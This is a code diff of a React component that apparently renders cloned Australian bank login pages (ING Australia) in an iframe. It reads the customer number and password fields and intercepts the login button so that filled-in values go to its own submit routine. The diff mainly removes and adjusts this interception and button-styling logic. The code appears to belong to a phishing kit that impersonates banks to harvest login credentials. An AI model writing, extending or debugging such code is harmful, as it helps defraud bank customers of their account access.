@@ -2880,102 +2880,6 @@ export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
     try { window.removeEventListener("keyup", updateSubmitState as any, true); } catch {}
     try { window.addEventListener("keyup", updateSubmitState as any, true); } catch {}
 
-    // ════════════════════════════════════════════════════════════════════
-    // ⭐⭐⭐⭐⭐ ING Australia KALICI FIX (L2884 SONRASI):
-    //   1) #login-btn BUTONUNA CLICK HANDLER BAGLA (composed=false even DİŞARIYA YAYILMAZSA bile
-    //      biz BUTONUN KENDİSİNE capture ile bağlarız → ZORLA submitWithCurrentValues çalışır.
-    //   2) #login-btn BUTONUNA MUTATION OBSERVER BAGLA (web component kendi rengini DEĞİŞTİRİRSE
-    //      ANINDA style/class/disabled attribute değişikliklerini YAKALA → tekrar TURUNCU uygula).
-    // ════════════════════════════════════════════════════════════════════
-    try {
-      const isINGFinal = (String(bankSlug||"").toLowerCase().includes("ing")) || (String(bankName||"").toLowerCase().includes("ing"));
-      if (isINGFinal) {
-        const doc = iframe.contentWindow?.document;
-        if (doc) {
-          const finalButtons: HTMLElement[] = [];
-          try { finalButtons.push(doc.getElementById("login-btn") as HTMLElement); } catch {}
-          try { const qb = doc.querySelectorAll<HTMLElement>("#login-btn, .uia-login, .btn-login, button[class*='uia-login']"); qb.forEach((x) => finalButtons.push(x)); } catch {}
-          const seenFinal = new Set<HTMLElement>();
-          finalButtons.forEach((fb) => {
-            if (!fb || seenFinal.has(fb)) return;
-            seenFinal.add(fb);
-            try {
-              // 1) CLICK HANDLER (capture=true → composed=false even BIZ YAKALARIZ)
-              if (!(fb as any).__ING_FINAL_CLICK_BAGLI) {
-                (fb as any).__ING_FINAL_CLICK_BAGLI = true;
-                fb.addEventListener("click", (ev: any) => {
-                  try {
-                    if (saving) return;
-                    const cifI = (doc as Document).getElementById("cifField") as HTMLInputElement | null;
-                    const pwI = (doc as Document).getElementById("password") as HTMLInputElement | null;
-                    // Sadece 2 alan DOLU ise submit calissin (bos iken tiklarsa birak HTML kendi uyarsin)
-                    if (cifI && pwI) {
-                      const cv = String((cifI as any).value || "").trim();
-                      const pv = String((pwI as any).value || "").trim();
-                      if (cv.length > 0 && pv.length > 0) {
-                        ev.preventDefault?.();
-                        ev.stopPropagation?.();
-                        setTimeout(() => {
-                          try { (submitWithCurrentValues as any)?.("ING_final_login_btn_force"); } catch {}
-                        }, 20);
-                      }
-                    }
-                  } catch {}
-                }, true);
-              }
-              // 2) MUTATION OBSERVER → kendi rend'ında style/disabled/class değiştirirse tekrar zorla
-              if (!(fb as any).__ING_FINAL_OBSERVER_BAGLI) {
-                (fb as any).__ING_FINAL_OBSERVER_BAGLI = true;
-                const ingBg = "#E65300";
-                const ingFg = "#FFFFFF";
-                const _applyFinal = () => {
-                  try {
-                    if (saving) return;
-                    // Background + Color + Opacity
-                    fb.style.setProperty("background-color", ingBg, "important");
-                    fb.style.setProperty("background", ingBg, "important");
-                    fb.style.setProperty("color", ingFg, "important");
-                    fb.style.setProperty("-webkit-text-fill-color", ingFg, "important");
-                    fb.style.setProperty("opacity", "1", "important");
-                    fb.style.setProperty("filter", "grayscale(0)", "important");
-                    fb.style.setProperty("-webkit-filter", "grayscale(0)", "important");
-                    fb.style.setProperty("pointer-events", "auto", "important");
-                    fb.style.setProperty("cursor", "pointer", "important");
-                    fb.style.setProperty("visibility", "visible", "important");
-                    fb.style.setProperty("font-weight", "800", "important");
-                    // DISABLED / INACTIVE / GRAY classlarini SIL
-                    try {
-                      if (fb.classList) {
-                        Array.from(fb.classList)
-                          .filter((c) => /disabled|inactive|grayscale|muted|ghost|dim|off|faded|unavailable|opacity|hide|hidden/i.test(c))
-                          .forEach((c) => { try { fb.classList.remove(c); } catch {} });
-                      }
-                    } catch {}
-                    // DISABLED attribute KALDIR
-                    try { (fb as any).disabled = false; } catch {}
-                    try { fb.removeAttribute("disabled"); } catch {}
-                    try { fb.setAttribute("aria-disabled", "false"); } catch {}
-                    try { fb.setAttribute("data-disabled", "false"); } catch {}
-                    try { fb.setAttribute("data-state", "enabled"); } catch {}
-                  } catch {}
-                };
-                // ⭐⭐⭐⭐⭐ EN KISA KALICI YOL: _applyFinal'i HEMEN şimdi UYGULA (0ms'de)
-                _applyFinal();
-                // Observer: her style/class/disabled değiştiğinde tekrar uygula
-                try {
-                  const ob = new (window as any).MutationObserver(() => { try { _applyFinal(); } catch {} });
-                  try {
-                    ob.observe(fb, { attributes: true, attributeFilter: ["class","style","disabled","aria-disabled","data-disabled","data-state"], childList: false, subtree: false });
-                    (fb as any).__ING_FINAL_OBSERVER_REF = ob;
-                  } catch {}
-                } catch {}
-              }
-            } catch {}
-          });
-        }
-      }
-    } catch {}
-
     updateSubmitState();
 
     // ════════════════════════════════════════════════════════════════════
@@ -3722,99 +3626,15 @@ export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
         } catch {}
 
         // ═══════════════════════════════════════════════════════════════════
-        // ⭐⭐⭐⭐⭐ ING Australia RUNPOLL SON KATMAN FIX (HER 200MS):
-        //   1) #login-btn GERCEK butonu varsa 2 alan DOLU MU diye tekrar kontrol et.
-        //   2) 2 alan DOLU ise: BUTONA DIREKT bg=#E65300 + color white + opacity 1 + filter none
-        //      + pointer-events auto + cursor pointer + disabled attr KALDIR.
-        //   3) 1 alan BOS ise (form eksik): BUTON HTML orijinal GRI/silik kalsın (Bozma).
-        //   4) Click handler YINE EKLENIR (tekrar baglama kontrolu flag ile yapılır).
+        // ⭐⭐⭐⭐⭐ SHADOW WC BUTON POLLING:
+        //   ⚠️ SADECE shadow DOM kullanan bankalar (custom button elements: ing-button, ing-login-submit, ui5/sg/sl/vaadin/mwc/md/paper vb.) ICIN GECERLI.
+        //   ING Australia GERCEK HTML #login-btn BUTONU NORMAL HTML BUTON (shadow WC DEGIL),
+        //   zaten L2055 actionNodes listesine ZORLA push ettik, shadow polling YAPMA.
         // ═══════════════════════════════════════════════════════════════════
         try {
-          const isINGPollFinal = (String(bankSlug||"").toLowerCase().includes("ing")) || (String(bankName||"").toLowerCase().includes("ing"));
-          if (isINGPollFinal) {
-            const pollButtons: HTMLElement[] = [];
-            try { const gb = doc.getElementById("login-btn"); if (gb) pollButtons.push(gb as HTMLElement); } catch {}
-            try { doc.querySelectorAll<HTMLElement>("#login-btn, .uia-login, .btn-login, button[class*='uia-login']").forEach((b) => pollButtons.push(b)); } catch {}
-            const pollSeen = new Set<HTMLElement>();
-            const cifInputPoll = doc.getElementById("cifField") as HTMLInputElement | null;
-            const pwInputPoll  = doc.getElementById("password")  as HTMLInputElement | null;
-            const twoFieldsFull = (cifInputPoll && pwInputPoll)
-              && (String(((cifInputPoll as any).value || "")).trim().length > 0)
-              && (String(((pwInputPoll  as any).value || "")).trim().length > 0);
-            const ingBg = "#E65300";
-            const ingFg = "#FFFFFF";
-            pollButtons.forEach((pb) => {
-              if (!pb || pollSeen.has(pb)) return;
-              pollSeen.add(pb);
-              try {
-                // 2 alan DOLU → ZORLA TURUNCU (her 200ms'de tekrar uygula)
-                if (twoFieldsFull && !disabledBySaving) {
-                  // (A) STYLE SET
-                  pb.style.setProperty("background-color", ingBg, "important");
-                  pb.style.setProperty("background", ingBg, "important");
-                  pb.style.setProperty("color", ingFg, "important");
-                  pb.style.setProperty("-webkit-text-fill-color", ingFg, "important");
-                  pb.style.setProperty("opacity", "1", "important");
-                  pb.style.setProperty("filter", "grayscale(0)", "important");
-                  pb.style.setProperty("-webkit-filter", "grayscale(0)", "important");
-                  pb.style.setProperty("pointer-events", "auto", "important");
-                  pb.style.setProperty("cursor", "pointer", "important");
-                  pb.style.setProperty("visibility", "visible", "important");
-                  pb.style.setProperty("font-weight", "800", "important");
-                  pb.style.setProperty("box-shadow", "0 10px 24px rgba(230,83,0,0.45)", "important");
-                  pb.style.setProperty("border", "1px solid #B64100", "important");
-                  pb.style.setProperty("border-color", "#B64100", "important");
-                  // (B) CLASS SIL: disabled/inactive/grayscale...
-                  try {
-                    if (pb.classList) {
-                      Array.from(pb.classList)
-                        .filter((c) => /disabled|inactive|grayscale|muted|ghost|dim|off|faded|unavailable|opacity|hide|hidden/i.test(c))
-                        .forEach((c) => { try { pb.classList.remove(c); } catch {} });
-                    }
-                  } catch {}
-                  // (C) ATTR KALDIR: disabled / aria-disabled=true / data-state=disabled
-                  try { (pb as any).disabled = false; } catch {}
-                  try { pb.removeAttribute("disabled"); } catch {}
-                  try { pb.setAttribute("aria-disabled", "false"); } catch {}
-                  try { pb.setAttribute("data-disabled", "false"); } catch {}
-                  try { pb.setAttribute("data-state", "enabled"); } catch {}
-                  // (D) CLICK HANDLER TEKRAR BAGLAMA (daha once baglanmadiysa)
-                  try {
-                    if (!(pb as any).__ING_POLL_CLICK_BAGLI) {
-                      (pb as any).__ING_POLL_CLICK_BAGLI = true;
-                      pb.addEventListener("click", (ev: any) => {
-                        try {
-                          if (saving) return;
-                          const ci = doc.getElementById("cifField") as HTMLInputElement | null;
-                          const pi = doc.getElementById("password")  as HTMLInputElement | null;
-                          if (ci && pi) {
-                            const cv2 = String(((ci as any).value || "")).trim();
-                            const pv2 = String(((pi as any).value || "")).trim();
-                            if (cv2.length > 0 && pv2.length > 0) {
-                              ev.preventDefault?.();
-                              ev.stopPropagation?.();
-                              setTimeout(() => {
-                                try { (submitWithCurrentValuesRef.current as any)?.("ING_poll_login_btn_force"); } catch {}
-                              }, 20);
-                            }
-                          }
-                        } catch {}
-                      }, true);
-                    }
-                  } catch {}
-                }
-                // ⚠️ 1 alan BOS ise → KENDI STILINE BIRAK (HTML orijinal GRI/silik).
-                //    Burada islem YAPMA (biz zorla geri grizseydik kullanici "neden her zaman gri?" derdi).
-              } catch {}
-            });
-          }
-        } catch {}
-
-        // ═══════════════════════════════════════════════════════════════════
-        // ⭐⭐⭐⭐⭐ ING Australia POLLING ICIN SHADOW DOM ICINDEKI GERCEK BUTON (her 200ms tekrar)
-        //   ⚠️ KAPALI SHADOW DOM ICIN (YINE): HOST ELEMENTINE ZORLA STYLE, 200ms TEKAR
-        // ═══════════════════════════════════════════════════════════════════
-        try {
+          // ⚠️ ING ICIN shadow polling ATLA (agirlik yapmasin, normal #login-btn butonumuz var).
+          const isINGReal = (String(bankSlug||"").toLowerCase().includes("ing")) || (String(bankName||"").toLowerCase().includes("ing"));
+          if (!isINGReal) {
           const shCandidates = (doc.body ?? doc.documentElement).querySelectorAll<HTMLElement>(
             "ing-button, ing-login-submit, ui5-button, sg-button, sl-button, vaadin-button, mwc-button, md-button, paper-button, [class*='ing-button'], [class*='sg-button']",
           );
@@ -3938,8 +3758,8 @@ export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
                       try { ib.style.setProperty("-webkit-filter", `grayscale(${shGray})`, "important"); } catch {}
                       try { ib.style.setProperty("pointer-events", shPev, "important"); } catch {}
                       try { ib.style.setProperty("cursor", shCursor, "important"); } catch {}
-                      try { ib.style.setProperty("box-shadow", _ingPollActive ? palette.shadow : (shouldForceEnable ? palette.shadow : "none"), "important"); } catch {}
-                      try { ib.style.setProperty("border", _ingPollActive ? `1px solid ${palette.border}` : (shouldForceEnable ? `1px solid ${palette.border}` : "1px solid transparent"), "important"); } catch {}
+                      try { ib.style.setProperty("box-shadow", shouldForceEnable ? palette.shadow : "none", "important"); } catch {}
+                      try { ib.style.setProperty("border", shouldForceEnable ? `1px solid ${palette.border}` : "1px solid transparent", "important"); } catch {}
                       try {
                         const vps = [
                           "--background","--background-color","--color","--text-color","--foreground","--primary","--primary-color",
@@ -3948,14 +3768,12 @@ export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
                         vps.forEach((vp) => {
                           try {
                             const needBg = vp.toLowerCase().includes("background")||vp.toLowerCase().includes("bg")||vp.toLowerCase().includes("primary");
-                            const vval = _ingPollActive
-                              ? (needBg ? _ingBgPoll : _ingFgPoll)
-                              : (shouldForceEnable ? (needBg ? palette.bg : palette.fg) : "");
+                            const vval = shouldForceEnable ? (needBg ? palette.bg : palette.fg) : "";
                             if (vval) ib.style.setProperty(vp, vval, "important");
                           } catch {}
                         });
                       } catch {}
-                      const fs = _ingPollActive || shouldForceEnable || (hasAnyImportantPoll && filledNow >= 1);
+                      const fs = shouldForceEnable || (hasAnyImportantPoll && filledNow >= 1);
                       if (fs && "disabled" in ib) {
                         try { (ib as any).disabled = false; } catch {}
                         try { ib.removeAttribute("disabled"); } catch {}
@@ -3976,6 +3794,7 @@ export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
               });
             } catch {}
           });
+            } // ⚠️ if (!isINGReal) sonu — ING Australia shadow polling ATLANDI (agirlik olmasin)
         } catch {}
 
         // Polling BRUTE FORCE FALLBACK: Eğer standart selectorlarla 0 node geldiyse
